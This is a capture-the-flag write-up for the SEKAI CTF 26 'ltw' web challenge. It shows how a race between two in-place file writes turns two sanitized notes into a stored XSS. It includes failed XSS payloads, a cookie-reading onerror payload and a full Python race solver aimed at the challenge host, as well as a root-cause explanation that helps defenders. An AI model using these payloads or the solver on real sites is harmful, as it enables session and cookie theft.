---
title: 'SEKAI CTF 26 / &amp;lt;\w+'
date: 2026-07-02 18:20:00 +0000
tags: [ctf, web, xss, race-condition]
read_time: "9 min read"
excerpt: "Stored XSS for SEKAI CTF 26 ltw, built from a sanitizer dead end and a file-write race."
---

<div class="callout">
  Source code for the challenge: <a href="{{ '/assets/downloads/sekai-ctf-2026-ltw-source.tar.gz' | relative_url }}" download>download the original archive</a>.
</div>

At first this looked like a parser mismatch challenge. The app takes note content, sanitizes it, stores it in a file, and later serves that file back as `text/html`. The obvious plan was to find a string that looked safe to the Go sanitizer but turned into executable HTML in Chrome.

That was the wrong layer.

The final solve was a stored XSS, but not because one payload bypassed the sanitizer. The stored file itself could be built out of two individually safe writes.

## App Shape

The service is tiny:

- `POST /create` sanitizes `message`, writes it to `/app/notes/<uuid>`, and redirects to `/notes/<uuid>`.
- `GET /notes/{id}` reads the file and serves it as `text/html;charset=utf-8`.
- `PUT /notes/{id}` sanitizes a new `message` and overwrites the existing note file.

The important sanitizer is:

```go
func sanitizer(msg string) (string, error) {
    if len(msg) > 128 {
        return "", fmt.Errorf("too long message")
    }

    if utf8.ValidString(msg) == false {
        return "", fmt.Errorf("invalid character")
    }

    sanitized := bluemonday.StrictPolicy().Sanitize(msg)

    // &lt;\w+
    sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
    sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")
    var reHTML = regexp.MustCompile(`<(/)?\w+`)

    sanitized = reHTML.ReplaceAllString(sanitized, "")

    return sanitized, nil
}
```

So the flow is:

1. `bluemonday.StrictPolicy()` strips or escapes HTML.
2. The app revives `&lt;` and `&gt;` into real angle brackets.
3. The regex removes anything that starts like `<tag` or `</tag`.

If we can get script execution, CSP is not the blocker. The proxy sets:

```text
default-src 'none'; script-src 'unsafe-inline';
```

Network exfil is blocked, but inline handlers still run. Since the bot exposes console output, logging `document.cookie` is enough.

## The Sanitizer Rabbit Hole

The first payloads died exactly how they should:

```html
&lt;svg onload=alert(1)&gt;
```

After entity revival and regex stripping, the useful opener is gone:

```text
 onload=alert(1)>
```

Same story for `img`, `script`, and the normal XSS list.

Then I tried to keep the `<` but make the next byte fail `\w`:

```text
<:svg/onload=...>
<-svg/onload=...>
< svg/onload=...>
<
svg/onload=...>
<\fsvg/onload=...>
```

Most of those survive the regex. Chrome just does not treat them as tag openers.

The annoying detail is that Chrome is strict at the one place I needed it to be loose. After `<`, a real tag needs an ASCII alpha. A newline, tab, form feed, NBSP, BOM, colon, dash, and the rest of the weird-byte pile do not turn into an opening tag.

One thing did work in Chrome:

```html
<<img src=x onerror=alert(1)>
```

The first `<` becomes junk, and the second `<img` becomes the real tag. The problem is that the app removes that second `<img`, so this only proved what shape I wanted the final bytes to have.

I also checked comments, bogus doctypes, processing-instruction-looking markup, CDATA-shaped junk, raw-text elements like `textarea` and `plaintext`, and parser differences around form feed. Nothing gave a single-request sanitizer bypass.

The useful conclusion from all that wasted time was simple:

I did not need a weird opener. I needed the file to literally contain a second opener.

## The File Write Bug

Both create and edit write notes directly into the final file path.

Create:

```go
f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
...
f.Write([]byte(sanitized))
```

Edit:

```go
f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
...
f.Write([]byte(sanitized))
```

There is no lock. There is no temp file. There is no atomic rename.

That matters because `O_TRUNC` truncates when the file is opened, not after every later write. If one writer writes a long body and another writer later writes a shorter body at offset `0`, the shorter write overwrites the prefix but does not delete the old suffix.

The public writeup by hxuu explains this with a longer offset pair: one safe write ends with `<`, another safe write carries `svg/onload=...>`, and the leftover suffix turns the file into `<svg/onload=...>`.

My final payload pair used the same idea, but smaller:

```text
A = &lt;
B = Ximg src=x onerror=console.log(document.cookie)>
```

After sanitization:

```text
A -> <
B -> Ximg src=x onerror=console.log(document.cookie)>
```

Neither result is a tag.

But if `B` writes first and `A` writes after it on the same file descriptor position, the final file can become:

```html
<img src=x onerror=console.log(document.cookie)>
```

The `X` from `B` is replaced by `<` from `A`. The rest of `B` remains on disk.

That is the whole bug.

## Transient Race vs Persistent Race

My first working race was the obvious noisy one:

1. create a note
2. keep alternating `PUT(A)` and `PUT(B)`
3. spam `GET /notes/{id}`
4. hope one read lands on the mixed bytes

That can show the XSS, but it is not a nice solve. It means the bot has to read the note during the race.

The better version is to stop caring about transient reads. Race the two `PUT`s, stop, then check what is actually stored.

If the final note body is still one of the safe states, try again:

```text
<
Ximg src=x onerror=console.log(document.cookie)>
```

If the final note body is the mixed state, the note is permanently useful:

```html
<img src=x onerror=console.log(document.cookie)>
```

Once that happens, there is no admin-bot timing anymore. Submit the URL and it just works.

## Solver

This is the solver I used.

```python
#!/usr/bin/env python3
import argparse
import threading

import requests


A = "&lt;"
B = "Ximg src=x onerror=console.log(document.cookie)>"
TARGET = "<img src=x onerror=console.log(document.cookie)>"


def create_note(base: str) -> str:
    resp = requests.post(
        f"{base}/create",
        data={"message": A},
        allow_redirects=False,
        timeout=5,
    )
    resp.raise_for_status()
    loc = resp.headers["Location"]
    return loc.rsplit("/", 1)[1]


def put_pair(url: str, sa: requests.Session, sb: requests.Session) -> None:
    barrier = threading.Barrier(2)

    def do_put(sess: requests.Session, msg: str) -> None:
        barrier.wait(timeout=1)
        sess.put(url, data={"message": msg}, allow_redirects=False, timeout=5)

    t1 = threading.Thread(target=do_put, args=(sa, A))
    t2 = threading.Thread(target=do_put, args=(sb, B))
    t1.start()
    t2.start()
    t1.join()
    t2.join()


def is_stable_target(url: str, session: requests.Session, reads: int) -> bool:
    for _ in range(reads):
        if session.get(url, timeout=5).text != TARGET:
            return False
    return True


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="https://ltw.chals.sekai.team")
    parser.add_argument("--id")
    parser.add_argument("--rounds", type=int, default=5000)
    parser.add_argument("--verify-reads", type=int, default=10)
    args = parser.parse_args()

    base = args.base.rstrip("/")
    note_id = args.id or create_note(base)
    url = f"{base}/notes/{note_id}"
    print(f"[note] {url}", flush=True)

    sa = requests.Session()
    sb = requests.Session()
    sg = requests.Session()

    for i in range(1, args.rounds + 1):
        put_pair(url, sa, sb)
        body = sg.get(url, timeout=5).text

        if i % 25 == 0:
            print(f"[{i}] {body!r}", flush=True)

        if body == TARGET and is_stable_target(url, sg, args.verify_reads):
            print(f"[success] {note_id}", flush=True)
            print(f"[url] {url}", flush=True)
            return

    print("[fail] no persistent hit in allotted rounds", flush=True)


if __name__ == "__main__":
    main()
```

The important part is the verification. I only accept success if repeated `GET`s return the target body after the writes are done.

## Local Proof

The stable target body was:

```html
<img src=x onerror=console.log(document.cookie)>
```

With a test `FLAG` cookie set in headless Chromium, visiting the note produced:

```text
FLAG=SEKAI{TEST}
```

That matches the challenge conditions: the bot carries the flag in a cookie and logs console output.

## Why This Works

The bug is not in `bluemonday` by itself. The strict policy does its job for a single request.

The app becomes vulnerable because it turns safe strings into final files using unsafe storage semantics:

- writes happen in place
- two writers can target the same file
- shorter writes do not erase a previous longer suffix
- readers get the final file as HTML

The sanitizer says “no single input can produce `<img`.”

The filesystem says “two writes can.”
